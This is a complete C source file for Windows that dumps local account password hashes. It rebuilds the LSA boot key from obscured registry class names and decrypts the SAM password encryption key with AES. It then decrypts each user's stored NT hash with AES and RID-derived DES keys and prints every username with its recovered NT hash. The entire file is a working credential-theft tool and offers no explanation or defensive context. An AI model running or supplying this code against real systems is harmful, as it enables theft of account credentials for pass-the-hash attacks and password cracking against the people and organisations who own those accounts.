#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include <bcrypt.h>
#pragma comment(lib, "bcrypt.lib")

typedef struct { unsigned char key[16]; } decodedBootKey;

typedef struct {
	wchar_t userRID[16];
	unsigned char username[64];
	unsigned char lmhash[64];
	unsigned char nthash[64];
	unsigned char nthash_des[32];
	unsigned char plaintext_nthash[16];
	DWORD nthash_size;
} user;

decodedBootKey GetLSASystemKey();
int EnumUsers();
void GetUserData(user*, int);
void GetPEK(decodedBootKey, unsigned char*);
void DecryptPEKAES(unsigned char*, unsigned char*, unsigned char*);
int DecodePasswordHash(unsigned char*, user*);
void DecodeDES(user*);
void ConvertDESKey(unsigned char* bytes, unsigned char* key);

UINT64 toInt64(unsigned char* bytes, int size);
UINT32 toInt32(unsigned char* bytes, UINT32 offset);
void Int32toByteArray(UINT32 num, unsigned char* bytes);

int main() {

	//Get the decoded boot key
	decodedBootKey decodedBootKey = GetLSASystemKey();

	//Get a list of users and query their account name, LM hash, and NT hash
	int numUsers = EnumUsers() - 1;
	user* userList = (user*)malloc(numUsers * sizeof(user));

	for(int i = 0; i < numUsers; i++)
		GetUserData(&userList[i], i);

	//Get the platform encryption key
	unsigned char decodedPEK[16];
	GetPEK(decodedBootKey, decodedPEK);

	printf("Dumping NT Hashes:\n(Username:NThash)");
	
	for (int i = 0; i < numUsers; i++)
	{
			printf("\n%ls", userList[i].username);
			printf(":");
			if (DecodePasswordHash(decodedPEK, &userList[i]) == 0)
			{
				DecodeDES(&userList[i]);
				for (int j = 0; j < 16; j++)
					printf("%02x", userList[i].plaintext_nthash[j]);
			}
			else
				printf("none");
	}
	
	return 0;
}

decodedBootKey GetLSASystemKey() {
	
	//Registry key paths where the obscured system key is stored
	LPCWSTR paths[] = { L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD", 
		L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1", 
		L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG", 
		L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\Data" };

	//RegQuery variables to store the classname
	HKEY key;
	LSTATUS status;
	wchar_t classname[256];
	unsigned char convclassname[256];
	DWORD cnamelen = 256;

	//Variables to convert wchar to byte
	wchar_t byteConv[3];
	byteConv[2] = 0xFF;

	//Variables to handle the system key
	unsigned char syskey[256];
	DWORD index = 0;
	decodedBootKey bootkey;

	//Byte order permutation to deobsfucate the system key after all 4 parts are attached
	char permutation[] = { 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 };

	//Reassemble the split bootkey value from the 4 different registry values
	for (int i = 0; i < 4; i++) {

		status = RegOpenKeyExW(HKEY_LOCAL_MACHINE, paths[i], 0, KEY_ALL_ACCESS, &key);
		status = RegQueryInfoKeyW(key, classname, &cnamelen, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL );
		
		//Convert the class name, stored as wchars, into a byte array
		for (DWORD i = 0; i < cnamelen; i+=2)
		{
			byteConv[0] = classname[i];
			byteConv[1] = classname[i + 1];
			convclassname[i/2] = (unsigned char)wcstoul(byteConv, NULL, 16);
		}

		RegCloseKey(key);

		//Append the current class name to the full system key
		for (DWORD i = 0; i < cnamelen/2; i++)
			syskey[i + index] = convclassname[i];

		index = index + (cnamelen/2);
		cnamelen = 256;
	}

	//Apply the permutation
	for (int i = 0; i < 16; i++)
		bootkey.key[i] = syskey[permutation[i]];

	return bootkey;
}

int EnumUsers(){
	HKEY key;
	LSTATUS status;
	int numUsers;

	status = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SAM\\SAM\\Domains\\Account\\Users", 0, KEY_READ, &key);
	status = RegQueryInfoKeyW(key, NULL, NULL, NULL, &numUsers, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	RegCloseKey(key);

	return numUsers;
}

void GetUserData(user* u, int index) {

	HKEY key;
	LSTATUS status;
	DWORD len = 256;

	status = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SAM\\SAM\\Domains\\Account\\Users", 0, KEY_READ, &key);
	status = RegEnumKeyExW(key, index, u->userRID, &len, NULL, NULL, NULL, NULL);
	RegCloseKey(key);

	wchar_t path1[128] = L"SAM\\SAM\\Domains\\Account\\Users\\";
	errno_t err = wcscat_s(path1, 128, u->userRID);

	unsigned char v[1024];
	len = 1024;

	//Get the V values from the user's registry key entry
	status = RegOpenKeyExW(HKEY_LOCAL_MACHINE, path1, 0, KEY_READ, &key);
	status = RegQueryValueExW(key, L"V", NULL, NULL, v, &len);
	RegCloseKey(key);

	//Query the V table for the name, LM hash, and NT hash
	DWORD attrSize = 17;
	DWORD baseOffset = 1 * 12; //name field
	DWORD offset = toInt32(v, baseOffset) + (attrSize * 12);
	DWORD vlen = toInt32(v, baseOffset + 4);
	for (DWORD i = offset, j = 0; i < offset + vlen; i++, j++) {
		u->username[j] = v[i];
	}

	baseOffset = 13 * 12; //LM hash field
	offset = toInt32(v, baseOffset) + (attrSize * 12);
	vlen = toInt32(v, baseOffset + 4);
	for (DWORD i = offset, j = 0; i < offset + vlen; i++, j++) {
		u->lmhash[j] = v[i];
	}

	baseOffset = 14 * 12; //NT hash field
	offset = toInt32(v, baseOffset) + (attrSize * 12);
	vlen = toInt32(v, baseOffset + 4);
	u->nthash_size = vlen;
	for (DWORD i = offset, j = 0; i < offset + vlen; i++, j++) {
		u->nthash[j] = v[i];
	}

	return;
}

void GetPEK(decodedBootKey bk, unsigned char* dpek) {

	HKEY key;
	unsigned char f[1024];
	int len = 1024;
	LSTATUS status;

	status = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SAM\\SAM\\Domains\\Account", 0, KEY_READ, &key);
	status = RegQueryValueExW(key, L"F", NULL, NULL, f, &len);
	RegCloseKey(key);

	DWORD encodingType = toInt32(f, 0x68);
	DWORD lOffset = toInt32(f, 0x6c) + 0x68;

	unsigned char encPEK[256];
	int j = 0;
	for (DWORD i = 0x70; i < 0x70 + lOffset - 1; i++) {
		encPEK[j] = f[i];
		j++;
	}

	DecryptPEKAES(encPEK, bk.key, dpek);

	return;
}

void DecryptPEKAES(unsigned char* encpek, unsigned char* syskey, unsigned char* dpek)
{
	//extract the length and data from the encrypted PEK key 
	DWORD hashLen = toInt32(encpek, 0);
	DWORD encLen = toInt32(encpek, 4);

	unsigned char iv[16];
	for (int i = 0x8, j = 0; i < 0x18; i++, j++)
		iv[j] = encpek[i];

	BYTE* data = (BYTE*)malloc(encLen * sizeof(BYTE));
	for (DWORD i = 0x18, j = 0; i < 0x18 + encLen; i++, j++)
		data[j] = encpek[i];

	BCRYPT_ALG_HANDLE hAlg = NULL;
	BCRYPT_KEY_HANDLE hKey = NULL;

	unsigned long status;
	unsigned char output[64];
	ULONG outputlen = 0;

	status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
	status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, syskey, 16, 0);
	status = BCryptDecrypt(hKey, data, encLen, 0, iv, 16, output, 64, &outputlen, BCRYPT_BLOCK_PADDING);
	status = BCryptCloseAlgorithmProvider(hAlg, 0);

	for (ULONG i = 0; i < outputlen; i++) 
		dpek[i] = output[i];
	
	
	return;
}

int DecodePasswordHash(unsigned char* pek, user* user)
{
	if (toInt32(user->nthash, 4) < 16)
		return 1;
	

	BCRYPT_ALG_HANDLE hAlg = NULL;
	BCRYPT_KEY_HANDLE hKey = NULL;

	unsigned long status;
	unsigned char output[128];
	ULONG outputlen = 0;

	unsigned char iv[16];
	for (int i = 8, j = 0; i < 0x18; i++, j++)
		iv[j] = user->nthash[i];

	BYTE* data = (BYTE*)malloc((user->nthash_size - 0x18) * sizeof(BYTE));
	for (DWORD i = 0x18, j = 0; i < user->nthash_size; i++, j++)
		data[j] = user->nthash[i];


	status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
	status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, pek, 16, 0);
	status = BCryptDecrypt(hKey, data, 32, NULL, iv, 16, output, 128, &outputlen, BCRYPT_BLOCK_PADDING);
	status = BCryptCloseAlgorithmProvider(hAlg, 0);

	for (ULONG i = 0; i < outputlen; i++) 
		user->nthash_des[i] = output[i];

	return 0;
}

void DecodeDES(user* user)
{
	UINT32 rid = 0;
	rid = (unsigned int)wcstoul(user->userRID, NULL, 16);

	unsigned char ridBytes[4];
	Int32toByteArray(rid, ridBytes);

	unsigned char key1Bytes[] = {ridBytes[2], ridBytes[1], ridBytes[0], ridBytes[3], ridBytes[2], ridBytes[1], ridBytes[0],0 };
	unsigned char key1[8];
	ConvertDESKey(key1Bytes, key1);

	unsigned char key2Bytes[] = {ridBytes[1], ridBytes[0], ridBytes[3], ridBytes[2], ridBytes[1], ridBytes[0], ridBytes[3],0  };
	unsigned char key2[8];
	ConvertDESKey(key2Bytes, key2);


	unsigned char finalHash[16];
	//decrypt the key
	BCRYPT_ALG_HANDLE hAlg = NULL;
	BCRYPT_KEY_HANDLE hKey = NULL;

	unsigned long status;
	ULONG outputlen = 0;

	unsigned char enc1[8];
	unsigned char enc2[8];

	unsigned char denc1[8];
	unsigned char denc2[8];

	for (int i = 0; i < 8; i++) {
		enc1[i] = user->nthash_des[i];
		enc2[i] = user->nthash_des[i + 8];
	}

	status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_DES_ALGORITHM, NULL, 0);

	status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key1, 8, 0);
	status = BCryptDecrypt(hKey, enc1, 8, NULL, NULL, 0, denc1, 8, &outputlen, 0);

	status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key2, 8, 0);
	status = BCryptDecrypt(hKey, enc2, 8, NULL, NULL, 0, denc2, 8, &outputlen, 0);

	status = BCryptCloseAlgorithmProvider(hAlg, 0);

	for (int i = 0; i < 16; i++) {
		if (i < 8)
			finalHash[i] = denc1[i];
		else
			finalHash[i] = denc2[i - 8];
	}

	for (int i = 0; i < 16; i++) {
		user->plaintext_nthash[i] = finalHash[i];
	}

	return;
}

void ConvertDESKey(unsigned char* bytes, unsigned char* key)
{
	UINT64 ikey = toInt64(bytes, 7);
	unsigned char b, c;
	for (int i = 7; i >= 0; i--){
		c = (ikey >> (i * 7)) & 0x7F;
		b = c;
		b = b ^ (b >> 4);
		b = b ^ (b >> 2);
		b = b ^ (b >> 1);
		key[7-i] = (c << 1) ^ (b & 0x1) ^ 0x1;
	}
	return;
}

UINT64 toInt64(unsigned char* bytes, int size)
{
	UINT64 num =0;

	for (int i = 0; i < size; i++)
		num |= (UINT64)bytes[i] << (8 * i);

	return num;
}

UINT32 toInt32(unsigned char* bytes, UINT32 offset)
{
	UINT32 num = bytes[offset] + (bytes[offset + 1] << 8) + (bytes[offset + 2] << 16) + (bytes[offset + 3] << 24);
	return num;
}

void Int32toByteArray(UINT32 num, unsigned char* bytes)
{
	bytes[0] = num & 0xFF;
	bytes[1] = (num >> 8) & 0xFF;
	bytes[2] = (num >> 16) & 0xFF;
	bytes[3] = (num >> 24) & 0xFF;
	return;
}
